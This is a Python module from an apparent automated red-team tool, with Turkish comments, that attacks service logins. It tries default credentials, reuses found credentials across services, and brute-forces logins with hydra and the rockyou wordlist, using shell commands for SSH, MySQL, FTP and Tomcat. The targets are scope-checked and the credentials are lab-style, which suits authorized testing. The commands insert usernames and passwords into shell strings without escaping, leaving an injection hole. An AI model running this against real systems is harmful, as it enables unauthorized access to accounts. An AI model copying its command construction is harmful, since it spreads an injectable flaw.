"""
AutoRedTeam - Credential Engine (Kimlik Bilgisi Motoru).

Default credential denemesi, credential reuse (bir serviste bulunan kimlik
bilgisini diger servislerde deneme) ve brute force islevlerini saglar.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from core.scope import is_target_allowed, run_command

logger = logging.getLogger(__name__)


@dataclass
class Credential:
    """Bulunan kimlik bilgisi."""
    username: str
    password: str
    service: str
    host: str
    port: int
    source: str = "default"  # default | reuse | brute | dump

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "password": self.password,
            "service": self.service,
            "host": self.host,
            "port": self.port,
            "source": self.source,
        }


# Servis bazli default credential'lar
DEFAULT_CREDS: Dict[str, List[tuple]] = {
    "ssh": [("msfadmin", "msfadmin"), ("user", "user"), ("root", "root")],
    "telnet": [("msfadmin", "msfadmin"), ("user", "user")],
    "mysql": [("root", ""), ("root", "root"), ("msfadmin", "msfadmin")],
    "postgresql": [("postgres", "postgres"), ("postgres", "")],
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("both", "tomcat")],
    "ftp": [("msfadmin", "msfadmin"), ("anonymous", "")],
    "smb": [("msfadmin", "msfadmin"), ("guest", "")],
    "vnc": [("", "")],  # null auth
}

# Servis -> varsayilan port
DEFAULT_PORTS: Dict[str, int] = {
    "ssh": 22, "telnet": 23, "ftp": 21, "mysql": 3306,
    "postgresql": 5432, "tomcat": 8180, "smb": 445, "vnc": 5900,
}


class CredentialEngine:
    """
    Kimlik bilgisi denemesi ve yeniden kullanimi.
    """

    def __init__(self, target: str):
        self.target = target
        self.found: List[Credential] = []

    def try_default_creds(
        self,
        service: str,
        host: str,
        port: int,
    ) -> List[Credential]:
        """Servis bazli default credential'lari dener."""
        if not is_target_allowed(host):
            return []

        creds = DEFAULT_CREDS.get(service.lower(), [])
        results: List[Credential] = []
        for username, password in creds:
            if self._test_credential(service, host, port, username, password):
                cred = Credential(
                    username=username, password=password,
                    service=service, host=host, port=port, source="default",
                )
                results.append(cred)
                self.found.append(cred)
        return results

    def reuse_credentials(
        self,
        creds: List[Credential],
        services: List[str],
    ) -> List[Credential]:
        """Bulunan credential'lari diger servislerde dener."""
        results: List[Credential] = []
        for cred in creds:
            for svc in services:
                if svc == cred.service:
                    continue
                port = self._default_port(svc)
                if self._test_credential(svc, cred.host, port, cred.username, cred.password):
                    new_cred = Credential(
                        username=cred.username, password=cred.password,
                        service=svc, host=cred.host, port=port, source="reuse",
                    )
                    results.append(new_cred)
                    self.found.append(new_cred)
        return results

    def brute_force(
        self,
        service: str,
        host: str,
        port: int,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        username: str = "msfadmin",
    ) -> List[Credential]:
        """hydra ile brute force (kucuk wordlist, egitim hedefleri icin)."""
        if not is_target_allowed(host):
            return []
        hydra_service = {
            "ssh": "ssh", "ftp": "ftp", "mysql": "mysql",
            "telnet": "telnet", "smb": "smb",
        }.get(service.lower())
        if not hydra_service:
            return []
        cmd = (
            f"hydra -l {username} -P {wordlist} -t 4 -f "
            f"{hydra_service}://{host}:{port} 2>&1 | head -50"
        )
        try:
            output = run_command(cmd, timeout=300)
            return self._parse_hydra_output(output, service, host, port)
        except Exception as e:
            logger.warning(f"[CredEngine] hydra hatasi: {e}")
            return []

    def _test_credential(
        self, service: str, host: str, port: int,
        username: str, password: str,
    ) -> bool:
        """Tek bir credential'i test eder. Servis bazli komut uretir."""
        svc = service.lower()
        if svc == "ssh":
            cmd = (
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=5 -p {port} {username}@{host} 'id' 2>&1"
            )
        elif svc == "mysql":
            pw = f"-p{password}" if password else ""
            cmd = (
                f"mysql -h {host} -P {port} -u {username} {pw} "
                f"-e 'SELECT 1' 2>&1"
            )
        elif svc == "ftp":
            cmd = (
                f"curl -s --max-time 5 -u {username}:{password} "
                f"ftp://{host}:{port}/ 2>&1"
            )
        elif svc == "tomcat":
            cmd = (
                f"curl -s --max-time 5 -u {username}:{password} "
                f"http://{host}:{port}/manager/html 2>&1 | head -5"
            )
        else:
            return False

        try:
            output = run_command(cmd, timeout=30)
            return self._is_success(output, svc)
        except Exception:
            return False

    def _is_success(self, output: str, service: str) -> bool:
        """Cikti basarili mi?"""
        if service == "ssh":
            return "uid=" in output
        if service == "mysql":
            return "1" in output and "ERROR" not in output.upper()
        if service == "ftp":
            return "230" in output or "drwx" in output
        if service == "tomcat":
            return "Tomcat" in output or "manager" in output.lower()
        return False

    def _parse_hydra_output(
        self, output: str, service: str, host: str, port: int,
    ) -> List[Credential]:
        """hydra ciktisini parse eder."""
        results = []
        for match in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", output):
            results.append(Credential(
                username=match.group(1), password=match.group(2),
                service=service, host=host, port=port, source="brute",
            ))
        return results

    def _default_port(self, service: str) -> int:
        return DEFAULT_PORTS.get(service.lower(), 0)

    def to_dict(self) -> Dict[str, Any]:
        return {"target": self.target, "found": [c.to_dict() for c in self.found]}
